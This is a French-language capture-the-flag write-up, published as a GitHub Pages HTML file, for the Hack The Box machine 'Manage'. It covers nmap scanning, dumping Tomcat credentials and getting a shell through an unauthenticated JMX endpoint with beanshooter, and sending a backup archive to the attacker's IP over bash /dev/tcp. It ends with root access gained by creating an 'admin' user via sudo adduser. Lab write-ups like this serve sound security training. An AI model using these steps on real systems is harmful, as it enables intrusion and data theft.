@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Manage | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Manage" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Foothold" />
+<meta property="og:description" content="Foothold" />
+<link rel="canonical" href="/HTB/season8/manage.html" />
+<meta property="og:url" content="/HTB/season8/manage.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-24T20:46:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Manage" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-24T20:46:00+01:00","datePublished":"2026-03-24T20:46:00+01:00","description":"Foothold","headline":"Manage","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/season8/manage.html"},"url":"/HTB/season8/manage.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Manage</h1>
+      <h2 class="project-tagline">Writeups & CTFs</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="foothold">Foothold</h1>
+
+<p>On commence par nmap</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sCV -T4 $box -oN nmap.out
+</code></pre></div></div>
+<p>nous montre des ports peu orthodoxes.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 15:52 -0400
+Nmap scan report for manage.htb (10.129.234.57)
+Host is up (0.033s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
+|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
+2222/tcp open  java-rmi Java RMI
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+| rmi-dumpregistry: 
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.1.1:36971
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+8080/tcp open  http     Apache Tomcat 10.1.19
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/10.1.19
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.08 seconds
+</code></pre></div></div>
+
+<p>On se connecte sur le site et on trouve un site apache tomcat pas configuré. En revanche, même avec la version du tomcat (10.1.19), on ne trouve aucune vulnérabilité. Via la page de hacktricks sur le pentest de java-rmi, on trouve <a href="https://github.com/qtc-de/remote-method-guesser?tab=readme-ov-file#installation" class="web-link">une page github</a> pour un script qui permette de pentest tout ça.</p>
+
+<p>Sur les conseils de hackthebox on utilise <a href="https://github.com/qtc-de/beanshooter" class="web-link">beanshooter</a> pour énumérer les utilisateurs.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar enum manage.htb 2222
+</code></pre></div></div>
+<p>et on trouve</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Checking available bound names:
+[+]
+[+]     * jmxrmi (JMX endpoint: 127.0.1.1:36803)
+[+]
+[+] Checking for unauthorized access:
+[+]
+[+]     - Remote MBean server does not require authentication.
+[+]       Vulnerability Status: Vulnerable
+[+]
+[+] Checking pre-auth deserialization behavior:
+[+]
+[+]     - Remote MBeanServer rejected the payload class.
+[+]       Vulnerability Status: Non Vulnerable
+[+]
+[+] Checking available MBeans:
+[+]
+[+]     - 189 MBeans are currently registred on the MBean server.
+[+]       Listing 167 non default MBeans:
+[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)
+
+...
+
+[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)
+[+]
+[+] Enumerating tomcat users:
+[+]
+[+]     - Listing 2 tomcat users:
+[+]
+[+]             ----------------------------------------
+[+]             Username:  manager
+[+]             Password:  fhErvo2r9wuTEYiYgt
+[+]             Roles:
+[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase
+[+]
+[+]             ----------------------------------------
+[+]             Username:  admin
+[+]             Password:  onyRPCkaG4iX72BrRtKgbszd
+[+]             Roles:
+[+]                        Users:type=Role,rolename="role1",database=UserDatabase
+</code></pre></div></div>
+
+<p>On voit aussi que jmx ne nécessite pas de creds pour se connecter. On commence par déployer un mbean sur la cible</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar standard manage.htb 2222 tonka
+</code></pre></div></div>
+
+<p>Et ensuite on l’utilise pour obtenir un shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar tonka shell manage.htb 2222   
+</code></pre></div></div>
+
+<p>Et avec ça on a notre premier accès.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/manage%20images/Pasted%20image%2020260330135527.png"></span></p>
+
+<h1 id="privilege-escalation-to-user">Privilege Escalation to user</h1>
+
+<p>Avec cet utilisateur on peut voir rapidement le flag <code class="language-plaintext highlighter-rouge">/opt/tomcat/user.txt</code>, voilà notre premier flag.</p>
+
+<p>Le premier accès obtenu, on commence par chercher à obtenir notre accès utilisateur. En regardant dans les folders de <code class="language-plaintext highlighter-rouge">/home</code>, on voit que l’un des deux utilisateurs a un fichier tar.gz stocké. On lance un listener sur notre machine</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4443 &gt; backup.tar.gz
+</code></pre></div></div>
+<p>Et on se l’envoie</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -c 'cat /home/useradmin/backups/backup.tar.gz &gt;&amp; /dev/tcp/10.10.15.35/4443 0&gt;&amp;1'
+</code></pre></div></div>
+
+<p>Sur la machine on extrait le fichier et on lit le contenu.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/manage%20images/Pasted%20image%2020260330135653.png"></span></p>
+
+<p>On tente d’utiliser le fichier <code class="language-plaintext highlighter-rouge">.ssh/id_ed25529</code> pour se connecter mais le ssh demande un code de vérification. On fouille un peu et on voit que l’on a aussi obtenu un fichier <code class="language-plaintext highlighter-rouge">.google_authenticator</code>. En regardant à l’intérieur on voit une suite de codes. on tente d’en rentrer un et bingo, on obtient un accès user!</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/manage%20images/Pasted%20image%2020260330135819.png"></span></p>
+
+<h1 id="privesc-to-root">PrivEsc to root</h1>
+
+<p>Evidemment on commence par un</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div></div>
+
+<p>Et on trouve assez vite que l’on a le droit d’ajouter un utilisateur, quelle aubaine!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for useradmin on manage:
+    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User useradmin may run the following commands on manage:
+    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
+</code></pre></div></div>
+
+<p>En fait il faut le savoir, ubuntu a un utiliser <code class="language-plaintext highlighter-rouge">admin</code> qui a par défaut toutes les permissions de root, mais si l’on regarde ici, on ne trouve pas de tel utilisateur, on peut donc le créer et facilement accéder à un utilisateur avec les droits root.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/manage%20images/Pasted%20image%2020260330163416.png"></span></p>
+
+<p>Et voilà, on a nos deux flags</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/manage%20images/Pasted%20image%2020260330163656.png"></span></p>
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
